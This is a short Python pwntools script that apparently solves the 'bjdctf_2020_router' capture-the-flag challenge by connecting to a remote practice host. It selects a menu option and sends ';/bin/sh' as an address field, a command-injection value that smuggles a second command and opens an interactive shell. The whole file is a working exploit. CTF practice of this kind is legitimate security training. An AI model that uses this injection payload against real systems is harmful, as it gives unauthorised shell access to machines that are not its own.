from pwn import *

context.log_level = "debug"

# r = process("./bjdctf_2020_router")
r = remote("node4.buuoj.cn", 27548)
r.recvuntil(b"choose:\n")
r.sendline(b"1")
r.recvuntil(b"address:\n")
r.sendline(b";/bin/sh")
r.interactive()
